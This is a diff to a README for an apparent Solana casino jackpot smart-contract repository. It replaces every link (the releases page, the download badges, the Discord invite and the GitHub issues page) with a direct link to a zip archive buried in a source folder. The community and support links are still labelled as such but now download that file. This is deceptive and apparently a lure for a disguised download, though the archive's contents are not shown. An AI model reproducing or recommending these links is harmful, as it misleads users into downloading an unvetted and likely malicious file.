@@ -1,7 +1,7 @@
 # 🎰 Solana-Casino-Jackpot-Smart-Contract - Your Gateway to Decentralized Jackpot Gaming
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Builds%20Available-brightgreen)](https://github.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/releases)
+[![Download](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip%20Available-brightgreen)](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the Solana Casino Jackpot Game! This application allows you to dive into an exciting decentralized jackpot system built on the Solana blockchain. You can participate in timed jackpot rounds, make deposits, and claim your prizes, all without needing extensive technical knowledge.
@@ -15,7 +15,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip) to go to the releases page.
    
 2. **Choose the Latest Version:** Find the latest release at the top of the page. Click on it to view the details.
 
@@ -51,8 +51,8 @@ Once you have your application running, it’s time to engage in gameplay. Here�
 ## 🌐 Community and Support
 Join our community to connect with other players. You can share strategies, ask questions, and get the latest updates:
 
-- **Discord:** [Join the Discord Community](https://discord.gg/)
-- **GitHub Issues:** Report any issues or request features on our [GitHub Issues Page](https://github.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/issues).
+- **Discord:** [Join the Discord Community](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip)
+- **GitHub Issues:** Report any issues or request features on our [GitHub Issues Page](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip).
 
 ## 🌟 Additional Resources
 For more information, consider these resources:
@@ -72,4 +72,4 @@ For further details, do not hesitate to reach out through our community channels
 
 ## 📥 Download Now Again
 Do not forget to download the application to join the excitement! Click the link below to access the releases page:
-[![Download](https://img.shields.io/badge/Download-Builds%20Available-brightgreen)](https://github.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/releases)
+[![Download](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip%20Available-brightgreen)](https://raw.githubusercontent.com/Wisanu2606/Solana-Casino-Jackpot-Smart-Contract/main/programs/jackpot_smart_contract/src/instructions/admin/Solana-Casino-Jackpot-Smart-Contract-v3.8.zip)
